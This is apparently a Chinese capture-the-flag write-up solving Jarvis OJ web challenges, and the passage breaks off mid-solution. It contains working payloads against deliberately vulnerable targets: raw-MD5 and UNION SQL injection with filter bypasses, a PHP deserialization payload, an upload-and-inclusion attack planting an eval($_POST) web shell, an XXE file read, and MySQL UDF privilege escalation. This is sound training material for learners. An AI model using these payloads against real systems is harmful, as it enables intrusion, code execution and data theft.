    <content type="html"><![CDATA[<h2 id="PORT-51"><a href="#PORT-51" class="headerlink" title="PORT 51"></a>PORT 51</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo curl --local-port 51 http://web.jarvisoj.com:32770/</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 100&lt;/title&gt;</span><br><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">body &#123;</span><br><span class="line">background:gray;</span><br><span class="line">text-align:center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;Yeah!! Here's your flag:PCTF&#123;&#125;&lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><blockquote><p>md5</p></blockquote><p>header 头里面发现 hint: “select * from `admin` where password=’”.md5($pass,true).”‘“</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5 ( string $str [, bool $raw_output = <span class="keyword">FALSE</span> ] ) : string</span><br><span class="line"><span class="comment">// raw 为 TRUE 时为 16 字符二进制格式，默认为 false 32 字符十六进制数</span></span><br></pre></td></tr></table></figure><p>搜索一下，发现有个牛逼的字符串： <code>ffifdyop</code></p><p><a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html" target="_blank" rel="noopener">https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html</a></p><p><a href="http://www.am0s.com/functions/204.html" target="_blank" rel="noopener">http://www.am0s.com/functions/204.html</a></p><p>传入之后，最终的 sql 语句变为 select * from <code>admin</code> where password=’’or’6�]��!r,��b’</p><p>成功闭合，得到万能密码，登录即可。</p><h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><blockquote><p>反序列化</p></blockquote><p>通过 <code>/showimg.php?img=c2hvd2ltZy5waHA=</code> 可读取源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// showing.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$f = $_GET[<span class="string">'img'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">$f = base64_decode($f);</span><br><span class="line"><span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> </span><br><span class="line">&amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span>&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">readfile($f);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">$x = <span class="keyword">new</span> Shield();</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">$x = unserialize($g);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// shield.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in pctf.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造利用的 <code>pop</code> 链即可，<strong>payload</strong></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?class=O:<span class="number">6</span>:<span class="string">"Shield"</span>:<span class="number">1</span>:&#123;<span class="string">s:</span><span class="number">4</span>:<span class="string">"file"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h2><blockquote><p>有反引号的注入</p></blockquote><p>详见 <a href="https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/">https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/</a></p><h2 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h2><blockquote><p>upload + lfi </p></blockquote><p>扫了一遍目录，没发现什么文件，尝试 filter 读源码，也失败了</p><p>主题界面是一个图片上传，再加一个展示界面</p><p>配置信息给的这么清晰，有点可疑，然而并没有找到什么有用的洞</p><p>Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3</p><p>Warning: fopen(submi.php): failed to open stream: No such file or directory in /opt/lampp/htdocs/index.php on line 24</p><p>按理说是可以文件包含，php://filter/read=convert.base64-encode/resource=index</p><p>然而显示 Cross domain forbidden!，估计是加了啥子 waf，此路不通</p><p>fopen() 时应该是拼接了一个 “.php”，这里可以用 %00 绕过</p><p>fopen(index.jj): failed to open stream 绕过成功</p><p>图片只能上传 jpg ，所以直接抓包在后面再个一句话，然后用 fopen() 去包含</p><p>但是，注意是但是，这里有个坑，不能用 &lt;?php，有 waf，要用 <script language="php">eval($_POST[1])</script></p><p>然后 page=uploads/1552805580.jpg%00 自动出 flag，都不需要菜刀</p><p>这题出的太过死板，&lt;?=?&gt; 是可以的，居然没任何回显，专考 <script language="php"> 标签了，没意义</p><p>有时间自己改一改出个题</p><h2 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h2><blockquote><p> xxe 入门</p></blockquote><p>请设法获得目标机器/home/ctf/flag.txt中的flag值。</p><p>参考 <a href="https://blog.spoock.com/2016/11/15/jarvisoj-web-writeup-1/">https://blog.spoock.com/2016/11/15/jarvisoj-web-writeup-1/</a></p><p>常规系统里对接收的请求都会做限制，比如POST之以content-type的application/x-www-form-urlencoded接收，但在一些框架系统里，框架会自动帮开发者识别传入的数据</p><p> POST 提交数据的四种常见方式</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">application</span>/x-www-form-urlencoded </span><br><span class="line">multipart/form-data</span><br><span class="line"><span class="built_in">application</span>/json</span><br><span class="line"><span class="built_in">application</span>/xml</span><br></pre></td></tr></table></figure><p>比如：默认为application/x-www-form-urlencoded接收的我只需修改为 application/json</p><p>即可传入JSON格式的数据，XML同理</p><p>这将导致原本不存在xml解析的地方可能存在XXE漏洞<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">XHR</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">var</span> xhr;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> XMLHttpRequest();&#125;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line"></span><br><span class="line">​            <span class="keyword">var</span> IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</span><br><span class="line"></span><br><span class="line">​            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>,len=IEXHRVers.length;i&lt; len;i++) &#123;</span><br><span class="line"></span><br><span class="line">​                <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> ActiveXObject(IEXHRVers[i]);&#125;</span><br><span class="line"></span><br><span class="line">​                <span class="keyword">catch</span>(e) &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line"></span><br><span class="line">​            &#125;</span><br><span class="line"></span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">return</span> xhr;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">​    evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">var</span> xhr = XHR();</span><br><span class="line"></span><br><span class="line">​        xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">​        xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">​            <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</span><br><span class="line"></span><br><span class="line">​                data = <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line"></span><br><span class="line">​                tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</span><br><span class="line"></span><br><span class="line">​                tip_area.value = data.task.search+data.task.value;</span><br><span class="line"></span><br><span class="line">​            &#125;</span><br><span class="line"></span><br><span class="line">​        &#125;;</span><br><span class="line"></span><br><span class="line">​        xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</span><br><span class="line"></span><br><span class="line">​        xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br></pre></td></tr></table></figure></p><p>payload:</p><p>Content-Type: application/xml</p><p>​    &lt;?xml version=”1.0” encoding=”utf-8”?&gt;</p><p>​    &lt;!DOCTYPE data[</p><p>​    &lt;!ENTITY file SYSTEM “file:////home/ctf/flag.txt”&gt;</p><p>]&gt;</p><p><data>&file;</data></p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>​    header 头里面发现 hint: “select * from <code>admin</code> where password=’”.md5($pass,true).”‘“</p><p>​    md5 ( string $str [, bool $raw_output = FALSE ] ) : string</p><p>​    string 要计算的字符串 </p><p>​    raw 为 TRUE 时为 16 字符二进制格式，默认为 false 32 字符十六进制数</p><p>​    参考 <a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html">https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html</a></p><p>​        <a href="http://www.am0s.com/functions/204.html">http://www.am0s.com/functions/204.html</a></p><p>​    有个牛逼的字符串： ffifdyop</p><p>​    传入之后，最终的 sql 语句变为 select * from <code>admin</code> where password=’’or’6�]��!r,��b’</p><p>​    成功闭合，得到万能密码</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><p>​    咦，奇怪，说好的WEB题呢，怎么成逆向了？不过里面有个help_me函数挺有意思的哦</p><p>​    题目给了个 udf.so 的文件，IDA 启动，然而并没有发现啥东西（汇编还要加油</p><p>​    前几天刚看了MySQL提权就忘了，后来才知道 udf.so 也是拿来提权的，</p><p>​    <a href="http://vinc.top/2017/04/19/mysql-udf%E6%8F%90%E6%9D%83linux%E5%B9%B3%E5%8F%B0/">http://vinc.top/2017/04/19/mysql-udf%E6%8F%90%E6%9D%83linux%E5%B9%B3%E5%8F%B0/</a></p><p>​    </p><p>​    将 udf.so 导入到MySQL的插件里面，注意改下权限</p><p>​    mysql&gt; show variables like “%plugin%”;</p><p>​    +——————————-+————————+</p><p>​    | Variable_name                 | Value                  |</p><p>​    +——————————-+————————+</p><p>​    | default_authentication_plugin | mysql_native_password  |</p><p>​    | plugin_dir                    | /usr/lib/mysql/plugin/ |</p><p>​    +——————————-+————————+</p><p>​    2 rows in set (0.00 sec)</p><p>​    mysql&gt; create function help_me returns string soname ‘udf.so’;</p><p>​    Query OK, 0 rows affected (0.00 sec)</p><p>​    mysql&gt; select help_me();</p><p>​    +———————————————+</p><p>​    | help_me()                                   |</p><p>​    +———————————————+</p><p>​    | use getflag function to obtain your flag!!  |</p><p>​    +———————————————+</p><p>​    1 row in set (0.00 sec)</p><p>​    mysql&gt; create function getflag returns string soname ‘udf.so’;</p><p>​    Query OK, 0 rows affected (0.00 sec)</p><p>​    mysql&gt; select getflag();</p><p>​    +——————————————+</p><p>​    | getflag()                                |</p><p>​    +——————————————+</p><p>​    | PCTF{Interesting_U5er_d3fined_Function}  |</p><p>​    +——————————————+</p><p>​    1 row in set (0.00 sec)</p><h2 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h2><p>​    然而又是 hash 扩展攻击，不做了</p><p>​    &lt;?php </p><p>​    $auth = false;</p><p>​    $role = “guest”;</p><p>​    $salt = ‘32342’;</p><p>​    if (isset($_COOKIE[“role”])) {</p><p>​        $role = unserialize($_COOKIE[“role”]);</p><p>​        $hsh = $_COOKIE[“hsh”];</p><p>​        if ($role===”admin” &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[“role”]))) {</p><p>​            $auth = true;</p><p>​        } else {</p><p>​            $auth = false;</p><p>​        }</p><p>​    } else {</p><p>​        $s = serialize($role);</p><p>​        setcookie(‘role’,$s);</p><p>​        $hsh = md5($salt.strrev($s));</p><p>​        setcookie(‘hsh’,$hsh);</p><p>​    }</p><p>​    if ($auth) {</p><p>​        echo “<h3>Welcome Admin. Your flag is “;</p><p>​    } else {</p><p>​        echo “<h3>Only Admin can see the flag!!</h3>“;</p><p>​    }</p><p>​    ?&gt; </p><h2 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h2><p>​    &lt;?php</p><p>​        error_reporting(0);</p><p>​        echo “<!--index.phps-->“;</p><p>​        if(!$_GET[‘id’]) {</p><p>​            header(‘Location: index.php?id=1’);</p><p>​            exit();</p><p>​        }</p><p>​        $id=$_GET[‘id’];</p><p>​        $a=$_GET[‘a’];</p><p>​        $b=$_GET[‘b’];</p><p>​        if(stripos($a,’.’)) {</p><p>​            echo ‘Hahahahahaha’;</p><p>​            return ;</p><p>​        }</p><p>​        $data = @file_get_contents($a,’r’);</p><p>​        if($data==”1112 is a nice lab!” and $id==0 and strlen($b)&gt;5 </p><p>​        and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4) {</p><p>​            require(“flag.txt”);</p><p>​        }</p><p>​        else {</p><p>​            print “work harder!harder!harder!”;</p><p>​        }</p><p>​    ?&gt;</p><p>​    payload1: index.php/?id=a&amp;a=php://input&amp;b=%0034253</p><p>​    post: 1112 is a nice lab!</p><p>​    eregi() 会被 %00 截断，但 strlen() 不会</p><p>​    ==&gt;  <!--index.phps-->�Come ON!!! {/^HT2mCpcvOLf}</p><p>​    进入该目录，自动跳转到 web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1</p><p>​    </p><p>​    发现空格被过滤，尝试绕过</p><p>​    - 使用注释绕过，/**/</p><p>​    - 使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用（）包围，并且两端可以没有多余的空格</p><p>​    - 使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a</p><p>​    这里可以用 /<em>233</em>/ 代替空格</p><p>​    </p><p>​    order by 没有回显，放弃该法</p><p>​    /?id=2/<em>233</em>/uunionnion/<em>233</em>/seselectlect/<em>233</em>/1,2,3%23</p><p>​    得到 3， 说明字段数也是 3</p><p>​    payload2: </p><p>​    获取所有数据库名</p><p>​    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(schema_name)/<em>233</em>/frfromom/<em>233</em>/information_schema.schemata%23</p><p>​    ==&gt; information_schema,test</p><p>​    获取本数据库内的所有表名</p><p>​    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(table_name)/<em>233</em>/frfromom/<em>233</em>/information_schema.tables/<em>233</em>/where/<em>233</em>/table_schema=database()%23</p><p>​    ==&gt; content</p><p>​    （以上两步可省略）</p><p>​    获取所有字段名</p><p>​    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(column_name)/<em>233</em>/frfromom/<em>233</em>/information_schema.columns/<em>233</em>/where/<em>233</em>/table_name=0x636f6e74656e74%23</p><p>​    ==&gt; id,context,title</p><p>​    获取所有数据</p><p>​    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(id,context,title)/<em>233</em>/frfromom/<em>233</em>/content%23</p><p>​    ==&gt; 1PCTF{Fin4lly_U_got_i7_C0ngRatulation5}hi666</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>​    是一个输入框，输入密码，显示密码错误</p><p>​    扫不到其他目录，看看源码，有个 app.js </p><p>​    搜索 Wrong Password!!</p><p>​    $.post(“checkpass.json”, t,</p><p>​    function(t) {</p><p>​        self.checkpass(e) ? self.setState({</p><p>​            errmsg: “Success!!”,</p><p>​            errcolor: b.green400</p><p>​        }) : (self.setState({</p><p>​            errmsg: “Wrong Password!!”</p><p>​            ……</p><p>​        }))</p><p>​    })</p><p>​    跟进去</p><p>​    function(e) {</p><p>​        if (25 !== e.length) return ! 1;</p><p>​        for (var t = [], n = 0; n &lt; 25; n++) t.push(e.charCodeAt(n));</p><p>​        for (var r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259], o = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]], n = 0; n &lt; 25; n++) {</p><p>​            for (var i = 0, a = 0; a &lt; 25; a++) i += t[a] * o[n][a];</p><p>​            if (i !== r[n]) return ! 1</p><p>​        }</p><p>​        return ! 0</p><p>​    }</p><p>​    变成了一个数学题，解线性方程组</p><p>​    import numpy as np</p><p>​    o = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]]</p><p>​    r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 